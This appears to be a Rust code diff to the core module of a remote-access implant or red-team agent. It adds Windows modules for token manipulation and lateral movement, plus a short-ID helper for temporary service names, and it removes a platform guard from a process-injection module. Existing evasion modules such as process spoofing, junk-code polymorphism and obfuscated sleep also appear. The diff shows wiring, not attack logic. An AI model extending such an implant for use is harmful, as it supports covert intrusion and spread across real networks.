@@ -6,6 +6,11 @@ pub mod process_manager;
 pub mod process_spoof;
 pub mod shell;
 
+#[cfg(windows)]
+pub mod token_manipulation;
+#[cfg(windows)]
+pub mod lateral_movement;
+
 #[cfg(feature = "outbound-c")]
 pub mod outbound;
 
@@ -51,6 +56,17 @@ use tokio::sync::{Mutex, RwLock};
 /// when the main loop holds the transport Mutex during `recv()` while a
 /// spawned command handler tries to acquire the same lock to send a response.
 const OUTBOUND_CHANNEL_CAPACITY: usize = 256;
+
+/// Generate a short alphanumeric identifier (8 chars) suitable for
+/// transient resource naming (e.g. temporary service names, file names).
+pub fn common_short_id() -> String {
+    use std::time::{SystemTime, UNIX_EPOCH};
+    let ts = SystemTime::now()
+        .duration_since(UNIX_EPOCH)
+        .unwrap_or_default()
+        .as_nanos();
+    format!("{:08x}", (ts as u32) ^ ((ts >> 32) as u32))
+}
 
 pub struct Agent {
     transport: Arc<Mutex<Box<dyn Transport + Send>>>,
@@ -525,7 +541,6 @@ pub mod stub;
 pub fn polymorph() {
     junk_macro::insert_junk!();
 }
-#[cfg(windows)]
 pub mod injection;
 
 pub mod obfuscated_sleep;
